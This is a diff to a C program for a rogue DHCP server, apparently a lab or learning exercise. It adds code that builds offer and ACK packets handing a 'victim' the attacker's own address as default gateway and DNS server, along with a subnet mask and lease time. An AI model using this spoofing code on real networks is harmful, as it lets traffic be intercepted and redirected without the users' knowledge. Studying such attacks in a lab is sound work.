@@ -17,6 +17,7 @@ char fake_server_ip[] = "192.168.56.1"; // Fake DHCP server address
 char fake_gateway[] = "192.168.56.1"; // Default gateway given to victim
 char fake_dns[] = "192.168.56.1"; // DNS server given to victim
 
+char fake_dhcp_ip[] = "10.0.2.15";
 
 /*
 storage for the DHCP DISCOVER packet.
@@ -151,10 +152,12 @@ int send_ack(int sockfd){
 
 
 /*
-Creates DHCP offer or ACK packet.
+creates DHCP offer or ACK packet
 DHCP_OFFER = 2
 DHCP_ACK   = 5
 */
+
+// https://datatracker.ietf.org/doc/html/rfc2132
 void create_dhcp_reply(struct dhcp_packet *packet, int type){
     memset(packet,0,sizeof(*packet));
 
@@ -174,12 +177,65 @@ void create_dhcp_reply(struct dhcp_packet *packet, int type){
     packet->options[2]=0x53;
     packet->options[3]=0x63;
 
-    //   DHCP message type - 53
-    packet->options[4]=53;
-    packet->options[5]=1;
-    packet->options[6]=type;
-    packet->options[7]=255;
 
+    int opt = 4;
+     packet->options[opt++] = 54;
+    packet->options[opt++] = 4;
+
+
+    struct in_addr server_addr;
+
+    inet_pton(AF_INET, fake_server_ip, &server_addr);
+
+    memcpy(&packet->options[opt], &server_addr, 4);
+
+    // DHCP Message Type (option 53)
+    packet->options[10] = 53;
+    packet->options[11] = 1;
+    packet->options[12] = type;
+
+
+    // Subnet Mask (Option 1)
+    packet->options[13] = 1;
+    packet->options[14] = 4;
+
+    packet->options[15] = 255;
+    packet->options[16] = 255;
+    packet->options[17] = 255;
+    packet->options[18] = 0;
+
+
+
+    // Router / Default Gateway (option 3)
+    packet->options[19] = 3;
+    packet->options[20] = 4;
+
+    struct in_addr gateway_addr;
+    inet_pton(AF_INET, fake_gateway, &gateway_addr);
+
+    memcpy(&packet->options[21], &gateway_addr, 4);
+
+    // DNS Server (option 6)
+    packet->options[25] = 6;
+    packet->options[26] = 4;
+
+    struct in_addr dns_addr;
+    inet_pton(AF_INET, fake_dns, &dns_addr);
+
+    memcpy(&packet->options[27], &dns_addr, 4);
+
+    // lease Time (option 51)
+    packet->options[31] = 51;
+    packet->options[32] = 4;
+
+    uint32_t lease_time = htonl(86400);
+
+    memcpy(&packet->options[33], &lease_time, 4);
+
+
+
+    // end of options
+    packet->options[37] = 255;
 }
 
 // for debug
